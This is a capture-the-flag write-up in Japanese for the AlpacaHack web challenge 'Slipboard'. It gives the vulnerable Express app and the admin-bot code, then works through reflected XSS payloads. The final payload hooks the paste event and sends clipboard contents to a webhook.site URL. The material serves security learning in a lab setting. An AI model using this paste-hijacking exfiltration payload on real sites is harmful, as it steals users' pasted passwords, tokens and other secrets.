---
title: "Slipboard - AlpacaHack Daily"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "alpacahack", "xss", "wasm", "eval", "headless-browser"]
summary: "web writeup for \"Slipboard\" from AlpacaHack Daily - techniques: alpacahack, xss, wasm, eval, headless-browser."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d30_Slipboard/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "Slipboard"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** Slipboard
- **Date:** 2026-05-30
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d30_Slipboard>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d30_Slipboard/README.md>

---
# Slipboard

Slip(うっかり漏らす) + Clipboard(クリップボード) = Slipboardというわけですね。

## 問題

間違ってコピペしちゃったけど、すぐ消したから大丈夫！

### web
```py
const express = require('express');

const app = express();
app.use(express.urlencoded({ extended: true }));

const html = `
<!DOCTYPE html>
<html>
  <body>
    <form action="/submit" method="post">
      <input id="input" name="name" type="text">
      <input id="submit" type="submit" value="OK">
    </form>
    {{ yours }}
  </body>
</html>
`;

app.get("/", async (req, res) => {
  const page = html.replace('{{ yours }}', req.query.q || '');
  res.send(page);
});

app.post("/submit", async (req, res) => {
  const page = html.replace('{{ yours }}', 'OK');
  res.send(page);
});

app.listen(3000, () => {
  console.log('Server listening on port 3000');
});
```

### bot
```py
export const visit = async (url) => {
  console.log(`Start visiting: ${url}`);

  const browser = await puppeteer.launch({
    headless: "new",
    pipe: true,
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  const context = await browser.createBrowserContext();

  try {
    // Copy the credentials into the clipboard.
    const page = await context.newPage();
    await page.goto('data:text/html, <html><body><p id="draft" contenteditable>');
    await page.type("#draft", FLAG);
    await page.keyboard.down("Control");
    await page.keyboard.press("A");
    await page.keyboard.press("C");
    await page.keyboard.up("Control");
    await page.close();
  } catch (e) {
    console.error(e);
  }

  try {
    const page = await context.newPage();
    await page.goto(url, { timeout: 3_000 });
    await sleep(1_000);

    await page.focus("#input");
    await page.keyboard.down("Control");
    await page.keyboard.press("V"); // Oops, no, I've accidentally pasted that!
    await page.keyboard.up("Control");

    await page.keyboard.down("Control");
    await page.keyboard.press("A");
    await page.keyboard.up("Control");
    await page.keyboard.press("Backspace"); // ... but deleted it immediately ;-)

    await page.keyboard.type(INPUT_TEXT);
    const data = await page.$eval("#input", ({ value }) => value);
    // We should double-check that it is the intended text.
    if (data === INPUT_TEXT) {
      await page.click("#submit");
    }

    await sleep(1_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`End visiting: ${url}`);
};
```

## 概要

この問題のサーバーでは`web`と`bot`の2つのサービスが稼働しています。

`web`では、何を送っても`OK`と表示されるだけで意味が無さそうなフォーム画面が表示されますが、`GET`でかつパラメータ`q`があるときはそれがHTMLにベタ書きされるようです。（XSSできそう？）

`bot`では、フラグをクリップボードにコピーしたあと指定したパラメータをもって`web`側のページにアクセスし、入力欄に貼り付けしたあとすぐに全消去し、`INPUT_TEXT`(=`hello :)`)を書き込んでから送信しているようです。

どうすればこのフラグを外部サイトに送信できるのでしょうか？

## 方針

貼り付けをトリガーとするイベントを利用する。

## 解法

Admin Bot関連の問題なので、まずは[Webhook.site](https://webhook.site/)で自分専用のURL
```
https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```
を取得します。

Admin Botにフラグをパラメータに持たせつつこのページにアクセスさせることができれば勝ちです。

パラメータ`q`にスクリプトを含めれば良さそうなので、まず最初はウォーミングアップがてら
```
?q=<script>location.href="https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx?flag="%2b"Alpaca{my_dummy}";</script>
```
で試してみると、ちゃんとWebhook.siteの自分に割り当てられたページに`Alpaca{my_dummy}`を送ることができました。

※`+`だけは`%2b`にエンコードする必要があるようです。

それなら、この`Alpaca{my_dummy}`の代わりにクリップボードの内容を送ればいいと考え、
```
?q=<script>location.href="https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx?foag="%2bnavigator.clipboard.readText();</script>
```
にしてみましたが、なぜか送ることができませんでした。

理由はわかりませんができないものは仕方が無いので方針を変えてみます。

Javascriptにはいろいろなイベントがあります。

`bot`側のシナリオでは、`web`側にアクセスした後入力欄にクリップボードの内容を貼り付けています。

この貼り付けによって発火するイベントとかがあるのではないでしょうか？

とりあえず調べてみます。
```
Javascript paste イベント［検索］☚ポチッ
```

すると、よさそうなのがありました。
```js
addEventListener("paste", (event) => {});
```
この`{}`の中に実行したい内容を書くみたいです。

そして、貼り付けた内容は、
```
event.clipboardData.getData("text")
```
によって取得できるようです。

そうすると、Admin Botで指定するパラメータは次のようにすればいいはずです。
```
?q=<script>document.addEventListener("paste",(event)=>{location.href="https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx?flag="%2bevent.clipboardData.getData("text");});</script>
```

このスクリプトをHTMLに埋め込んでおくことにより、Admin Botが貼り付けをしたときに発動する罠を仕込むことができるというわけですね。

実際にこれでやってみると、フラグを取得することができました！
